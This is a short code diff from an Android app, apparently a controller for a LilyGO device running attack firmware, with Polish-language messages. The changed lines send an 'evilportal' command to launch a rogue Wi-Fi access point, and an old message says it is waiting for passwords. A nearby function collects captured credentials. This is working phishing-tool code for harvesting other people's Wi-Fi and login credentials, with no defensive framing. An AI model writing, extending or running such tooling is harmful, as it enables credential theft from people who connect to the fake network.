@@ -247,8 +247,8 @@ class EvilPortalGeneratorActivity : AppCompatActivity() {
             Toast.makeText(this, "Brak kodu HTML do wysłania!", Toast.LENGTH_SHORT).show()
             return
         }
-        BruceBleIrLink.sendCustomCommand(this, "evilportal start")
-        Toast.makeText(this, "Uruchomiono Evil Portal Rogue AP na LilyGO! Oczekiwanie na hasła...", Toast.LENGTH_LONG).show()
+        BruceBleIrLink.sendCustomCommand(this, "evilportal")
+        Toast.makeText(this, "Wysłano komendę 'evilportal' do LilyGO. Uruchamianie AP...", Toast.LENGTH_LONG).show()
     }
 
     private fun addCapturedCredential(cred: String) {
